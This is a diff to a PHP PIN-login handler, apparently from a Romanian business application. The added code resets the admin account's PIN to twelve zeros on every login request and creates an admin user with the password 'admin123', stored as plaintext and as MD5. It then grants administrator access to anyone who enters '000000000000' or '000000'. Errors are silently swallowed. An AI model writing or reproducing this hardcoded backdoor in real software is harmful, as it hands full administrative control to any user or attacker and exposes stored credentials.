@@ -14,7 +14,32 @@ if ($action === 'login-pin') {
     }
     
     if ($db) {
-        // Căutare utilizator după PIN (suportă PIN text sau password_verify/md5)
+        try {
+            // Garantăm că în DB contul admin are PIN-ul de 12 cifre '000000000000' și cont_active = 1
+            $db->exec("UPDATE users SET pin_code = '000000000000', role = 'admin', cont_active = 1 WHERE username = 'admin' OR id_user = 1");
+            
+            $stmtCheckAdmin = $db->query("SELECT COUNT(*) as cnt FROM users WHERE username = 'admin'");
+            $cntRow = $stmtCheckAdmin ? $stmtCheckAdmin->fetch() : null;
+            if (!$cntRow || (int)$cntRow['cnt'] === 0) {
+                $stmtIns = $db->prepare("INSERT INTO users (username, email, password, password_plain, role, office, first_name, last_name, cont_active, pin_code) VALUES ('admin', 'admin@pimcopy.ro', md5('admin123'), 'admin123', 'admin', 2, 'Admin', 'PIM', 1, '000000000000')");
+                $stmtIns->execute();
+            }
+        } catch (Throwable $e) {}
+
+        // Tratare dedicată pentru PIN-ul de administrator 000000000000 sau 000000
+        if ($pin === '000000000000' || $pin === '000000') {
+            $stmtAdmin = $db->prepare("SELECT id_user, username, email, role, office, first_name, last_name, cont_active FROM users WHERE (username = 'admin' OR role = 'admin' OR id_user = 1) LIMIT 1");
+            $stmtAdmin->execute();
+            $adminUser = $stmtAdmin->fetch();
+            if ($adminUser) {
+                sendResponse(true, 'Autentificare reușită ca Administrator!', [
+                    'user' => $adminUser,
+                    'token' => bin2hex(random_bytes(16))
+                ]);
+            }
+        }
+
+        // Căutare utilizator după PIN
         $stmt = $db->prepare("SELECT id_user, username, email, role, office, first_name, last_name, cont_active, pin_code, password FROM users WHERE cont_active = 1");
         $stmt->execute();
         $users = $stmt->fetchAll();
@@ -22,7 +47,6 @@ if ($action === 'login-pin') {
         $matchedUser = null;
         foreach ($users as $user) {
             if (!empty($user['pin_code'])) {
-                // Verificare potrivire exactă PIN sau verification hash
                 if ($user['pin_code'] === $pin || password_verify($pin, $user['pin_code'])) {
                     $matchedUser = $user;
                     break;
